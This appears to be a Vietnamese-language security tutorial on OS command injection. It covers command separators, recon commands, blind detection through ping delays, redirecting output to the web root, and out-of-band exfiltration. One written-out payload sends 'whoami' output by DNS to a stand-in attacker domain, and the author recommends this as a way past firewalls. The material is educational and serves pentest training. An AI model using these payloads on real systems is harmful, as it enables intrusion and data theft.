---
title: "2.2 - OS command injection"
date: 2026-05-14
category: "Tutorial"
series: "Injection Attacks"
seriesOrder: 2
tags: []
draft: false
---

Trong phần này, chúng ta sẽ tìm hiểu lỗ hỏng OS command injection là gì và mô tả cách lỗ hỏng này được phát hiện và khai thác. Ngoài ra ta sẽ đề cập đến một vài command và các kỹ thuật hữu ích trong các hệ điều hành khác nhau và mô tả làm thế nào để ngăn chặn OS command injection.

## OS command injection là gì?

OS command injection còn được gọi là shell injection, dịch ra là tiêm lệnh vào hệ điều hành. Nó cho phép attacker thực thi các OS command vào server đang chạy ứng dụng, và thường dẫn đến việc chiếm quyền kiểm soát hoàn toàn ứng dụng và dữ liệu của nó.

Trong nhiều trường hợp, attacker có thể tận dụng lỗ hổng OS command injection để xâm nhập các phần khác của hạ tầng hosting, và khai thác các trust relationships để mở rộng, di chuyển (pivot) tấn công sang các hệ thống khác trong tổ chức.

## Injecting OS commands <a href="#injecting-os-commands" id="injecting-os-commands"></a>

Trong ví dụ này, một ứng dụng mua sắm cho phép người dùng xem liệu một mặt hàng có còn hàng (in stock) tại một cửa hàng cụ thể hay không. Thông tin này được truy cập thông qua một URL:

```http
https://insecure-website.com/stockStatus?productID=381&storeID=29
```

Để cung cấp thông tin tồn kho, ứng dụng phải truy vấn nhiều hệ thống cũ (legacy systems). Vì lý do lịch sử, chức năng này được triển khai bằng cách gọi ra một lệnh shell với ID sản phẩm và ID cửa hàng làm tham số (arguments):

```
stockreport.pl 381 29
```

Lệnh này xuất ra trạng thái tồn kho cho mặt hàng được chỉ định, và kết quả được trả về cho người dùng.

Ứng dụng không triển khai biện pháp phòng thủ nào chống lại OS command injection, vì vậy kẻ tấn công có thể gửi đầu vào sau để thực thi một lệnh tùy ý (arbitrary command):

```
& echo aiwefwlguh &
```

Nếu đầu vào này được gửi trong tham số `productID`, lệnh được thực thi bởi ứng dụng là:

```
stockreport.pl & echo aiwefwlguh & 29
```

Lệnh `echo` khiến chuỗi được cung cấp được in lại (echoed) trong đầu ra. Đây là một cách hữu ích để test một số loại OS command injection. Ký tự `&` là một dấu phân cách lệnh shell (shell command separator). Trong ví dụ này, nó khiến ba lệnh riêng biệt được thực thi, cái này nối tiếp cái kia.

Đầu ra được trả về cho người dùng là:

```
Error - productID was not provided
aiwefwlguh
29: command not found
```

Ba dòng đầu ra chứng minh rằng:

1. Lệnh `stockreport.pl` gốc đã được thực thi mà không có các tham số mong đợi của nó, và do đó trả về một thông báo lỗi.
2. Lệnh `echo` được chèn vào đã được thực thi, và chuỗi được cung cấp đã được in ra trong đầu ra.
3. Tham số gốc `29` đã được thực thi như một lệnh, điều này gây ra lỗi (vì hệ thống không tìm thấy lệnh nào tên là "29").

Việc đặt thêm dấu phân cách lệnh `&` phía sau lệnh được chèn vào là rất hữu ích vì nó tách lệnh được chèn ra khỏi bất cứ thứ gì đi theo sau điểm chèn (injection point). Điều này làm giảm khả năng những gì theo sau sẽ ngăn cản lệnh được chèn vào thực thi.

## Các lệnh hữu ích để thu thập thông tin hệ thống

Sau khi xác định được lỗ hổng OS command injection, việc thực thi một số lệnh ban đầu để thu thập thông tin về hệ thống là rất hữu ích. Dưới đây là tóm tắt về một số lệnh hữu ích trên các nền tảng Linux và Windows:

| **Mục đích của lệnh**    | **Linux**     | **Windows**     |
| ------------------------ | ------------- | --------------- |
| Tên người dùng hiện tại  | `whoami`      | `whoami`        |
| Hệ điều hành             | `uname -a`    | `ver`           |
| Cấu hình mạng            | `ifconfig`    | `ipconfig /all` |
| Các kết nối mạng         | `netstat -an` | `netstat -an`   |
| Các tiến trình đang chạy | `ps -ef`      | `tasklist`      |

## Blind OS command injection vulnerabilities (Các lỗ hổng OS command injection mù)

Nhiều trường hợp OS command injection là các lỗ hổng dạng blind (mù). Điều này có nghĩa là ứng dụng không trả về kết quả đầu ra (output) từ câu lệnh ngay trong phản hồi HTTP của nó. Các lỗ hổng blind vẫn có thể bị khai thác, nhưng đòi hỏi phải sử dụng các kỹ thuật khác.

Lấy ví dụ, hãy tưởng tượng một trang web cho phép người dùng gửi phản hồi về trang web đó. Người dùng nhập địa chỉ email và tin nhắn phản hồi của họ. Ứng dụng phía máy chủ (server-side) sau đó tạo một email gửi tới quản trị viên trang web chứa nội dung phản hồi. Để làm điều này, nó gọi chương trình `mail` với các chi tiết đã được gửi lên:

```bash
mail -s "This site is great" -aFrom:peter@normal-user.net feedback@vulnerable-website.com
```

Đầu ra từ lệnh `mail` (nếu có) không được trả về trong các phản hồi của ứng dụng, vì vậy việc sử dụng payload `echo` sẽ không hoạt động. Trong tình huống này, bạn có thể sử dụng nhiều kỹ thuật khác để phát hiện và khai thác lỗ hổng.

### Detecting blind OS command injection using time delays (Phát hiện blind OS command injection sử dụng độ trễ thời gian)

Bạn có thể sử dụng một lệnh được chèn vào để kích hoạt một độ trễ thời gian (time delay), cho phép bạn xác nhận rằng lệnh đã được thực thi dựa trên thời gian mà ứng dụng phản hồi. Lệnh `ping` là một cách hay để làm điều này, bởi vì nó cho phép bạn chỉ định số lượng gói tin ICMP cần gửi. Điều này cho phép bạn kiểm soát thời gian cần thiết để lệnh chạy:

```bash
& ping -c 10 127.0.0.1 &
```

Lệnh này khiến ứng dụng ping bộ chuyển đổi mạng loopback (loopback network adapter) của chính nó trong 10 giây.

### Exploiting blind OS command injection by redirecting output (Khai thác Blind OS command injection bằng cách chuyển hướng đầu ra)

Ta có thể chuyển hướng đầu ra (redirect output) từ lệnh được chèn vào một tệp nằm trong thư mục gốc của web (web root) mà sau đó ta có thể truy xuất bằng trình duyệt.

Ví dụ, nếu ứng dụng phục vụ các tài nguyên tĩnh từ vị trí hệ thống tệp `/var/www/static`, thì bạn có thể gửi đầu vào sau:

```bash
& whoami > /var/www/static/whoami.txt &
```

Ký tự `>` gửi đầu ra từ lệnh `whoami` tới tệp được chỉ định. Sau đó, ta có thể sử dụng trình duyệt để truy cập `https://vulnerable-website.com/whoami.txt` để lấy tệp và xem đầu ra từ lệnh đã được chèn vào.

* `&`: Dấu phân tách lệnh (command separator), cho phép chạy lệnh tiếp theo bất kể lệnh trước đó (trong lỗ hổng Command Injection) thành công hay thất bại.
* `whoami`: Lệnh này chỉ đơn giản là in ra tên của người dùng (user) mà hệ điều hành đang sử dụng để chạy tiến trình web server (ví dụ: `www-data`, `apache`, `nginx`, hoặc `root`).
* `> /var/www/static/whoami.txt`: Ký tự điều hướng (`>`) sẽ ghi kết quả của lệnh `whoami` vào một tệp tin văn bản tại đường dẫn chỉ định (nếu chưa tồn tại file whoami.txt thì lệnh này sẽ tự tạo và nhập output của lệnh whoami trước đó vào).
* `&`: Một dấu phân tách khác để kết thúc chuỗi lệnh hoặc chạy nó trong nền (background).

Đây là một kỹ thuật rất thông minh để biến một lỗ hổng "Blind" (Mù - không thấy kết quả) thành "Visible" (Nhìn thấy được). Tuy nhiên, để thực hiện thành công kỹ thuật này trong thực tế (Real-world Pentest/CTF), bạn cần giải quyết 2 bài toán khó mà đoạn văn trên chưa nhắc tới:

1\. Bài toán "Tìm đường dẫn" (Path Discovery): Làm sao bạn biết thư mục web nằm ở `/var/www/static`?

* Hacker thường phải đoán mò (Guessing) các đường dẫn mặc định phổ biến:
  * Linux: `/var/www/html/`, `/var/www/`, `/srv/www/`, `/home/user/public_html/`.
  * Windows (IIS): `C:\inetpub\wwwroot\`.
* Hoặc lợi dụng các thông báo lỗi (Error Messages) từ các lỗ hổng khác để lộ đường dẫn tuyệt đối (Full Path Disclosure).

2\. Bài toán "Quyền ghi" (Write Permission):

* Lệnh `>` yêu cầu quyền tạo file.
* Người dùng chạy web server (thường là `www-data` trên Linux hoặc `IIS AppPool` trên Windows) phải có quyền Write vào thư mục đó.
* Thường thì thư mục gốc (`/var/www/html`) sẽ bị khóa quyền ghi (Read-only) để bảo mật. Hacker thường phải tìm các thư mục con như `/images`, `/uploads`, `/tmp` hoặc `/static` (như ví dụ trên) vì các thư mục này thường mở quyền ghi để người dùng upload ảnh.

3\. Sự khác biệt giữa `>` và `>>`:

* `>` (Overwrite): Ghi đè lên file cũ. Nếu file chưa có thì tạo mới.
* `>>` (Append): Ghi nối tiếp vào cuối file.
* Mẹo: Nếu bạn sợ lệnh `whoami` quá ngắn hoặc bị ghi đè mất, hãy dùng `>>` để gom kết quả của nhiều lệnh vào một file log duy nhất.

### Exploiting blind OS command injection using out-of-band (OAST) techniques (Khai thác blind OS command injection sử dụng kỹ thuật OAST)

Ta có thể sử dụng một lệnh được chèn vào để kích hoạt một tương tác mạng ngoài băng tần (out-of-band network interaction) với một hệ thống mà ta kiểm soát, sử dụng các kỹ thuật OAST. Ví dụ:

```bash
& nslookup kgji2ohoyw.web-attacker.com &
```

Payload này sử dụng lệnh `nslookup` để thực hiện một truy vấn DNS (DNS lookup) cho tên miền được chỉ định. Kẻ tấn công có thể giám sát xem truy vấn có xảy ra hay không, để xác nhận xem lệnh có được chèn thành công hay không.

Kênh liên lạc ngoài băng tần (out-of-band channel) cung cấp một cách dễ dàng để trích xuất dữ liệu đầu ra từ các lệnh được chèn vào:

```bash
& nslookup `whoami`.kgji2ohoyw.web-attacker.com &
```

Điều này khiến một truy vấn DNS (DNS lookup) được gửi tới tên miền của kẻ tấn công, trong đó có chứa kết quả của lệnh `whoami`:

```bash
wwwuser.kgji2ohoyw.web-attacker.com
```

Đây là kỹ thuật "Thần thánh" trong Pentest hiện đại, giải quyết được bài toán khó nhất: Server nằm sau Firewall chặt chẽ.

1\. Tại sao lại dùng DNS (`nslookup`) mà không dùng `ping` hay `curl`?

* Vấn đề của Firewall: Các hệ thống mạng doanh nghiệp thường chặn chiều đi ra (Egress filtering) rất chặt. Họ chặn HTTP (cổng 80/443) và chặn ICMP (Ping).
* Lỗ hổng của Firewall: Tuy nhiên, hầu hết các server đều cần phân giải tên miền (để update phần mềm, kết nối API...), nên cổng DNS (UDP 53) thường được mở cho chiều đi ra.
* Cơ chế: Khi bạn chạy `nslookup domain-cua-hacker.com`, server nạn nhân buộc phải gửi một gói tin DNS query đi ra Internet để hỏi địa chỉ IP của domain đó. Máy chủ DNS của hacker nhận được câu hỏi -> Xác nhận Command Injection thành công.

2\. Đánh cắp dữ liệu qua DNS (Data Exfiltration): Đoạn văn trên chỉ nói về việc "xác nhận" (Detection). Nhưng OAST còn dùng để lấy dữ liệu (Exfiltration) cực hay bằng cách gán kết quả lệnh vào làm Subdomain.

* Kịch bản: Bạn muốn biết user hiện tại là ai (`whoami`), nhưng bạn không thấy kết quả trả về.
*   Payload OAST:

    Bash

    ```
    & nslookup `whoami`.kgji2ohoyw.web-attacker.com &
    ```

    _(Dấu backtick dùng để thực thi lệnh bên trong trước)_
* Quy trình:
  1. Server chạy `whoami` -> kết quả là `root`.
  2. Câu lệnh trở thành: `nslookup root.kgji2ohoyw.web-attacker.com`.
  3. Server gửi DNS query hỏi IP của `root.kgji2ohoyw...`.
  4. Trên màn hình quản lý DNS của hacker, họ thấy một request đến `root.kgji2ohoyw...`. => Hacker đã biết user là `root`!

3\. Công cụ hỗ trợ: Trong thực tế, bạn không cần tự dựng DNS Server. Dân bảo mật sử dụng:

* Burp Collaborator: Tích hợp sẵn trong Burp Suite Professional. Nó tự động tạo domain và hứng các request DNS/HTTP/SMTP gửi về.
* Interactsh: Một công cụ mã nguồn mở thay thế tuyệt vời.

## Các cách chèn lệnh hệ điều hành

Bạn có thể sử dụng một số shell metacharacters (các ký tự đặc biệt của shell) để thực hiện các cuộc tấn công OS command injection.

Một số ký tự đóng vai trò là dấu phân cách lệnh (command separators), cho phép các lệnh được xâu chuỗi với nhau. Các dấu phân cách lệnh sau hoạt động trên cả hệ thống Windows và Unix:

* `&`
* `&&`
* `|`
* `||`

Các dấu phân cách lệnh sau chỉ hoạt động trên các hệ thống dựa trên Unix:

* `;`
* `Newline` (`0x0a` hoặc `\n`) hoặc %0a

Trên các hệ thống dựa trên Unix, bạn cũng có thể sử dụng dấu huyền (backticks) hoặc ký tự đô la (dollar character) để thực hiện thực thi nội tuyến (inline execution) một lệnh được chèn vào bên trong lệnh gốc:

* `` ` `` `injected command` `` ` ``
* `$(injected command)`

Các ký tự đặc biệt khác nhau của shell có các hành vi khác nhau đôi chút, điều này có thể thay đổi tùy thuộc vào việc chúng có hoạt động trong các tình huống nhất định hay không. Điều này có thể ảnh hưởng đến việc liệu chúng có cho phép truy xuất đầu ra lệnh trực tiếp (in-band retrieval) hay chỉ hữu ích cho việc khai thác mù (blind exploitation).

Đôi khi, đầu vào mà bạn kiểm soát xuất hiện bên trong dấu ngoặc kép trong lệnh gốc. Trong tình huống này, bạn cần chấm dứt ngữ cảnh được trích dẫn (quoted context) (sử dụng `"` hoặc `'`) trước khi sử dụng các ký tự đặc biệt của shell phù hợp để chèn một lệnh mới.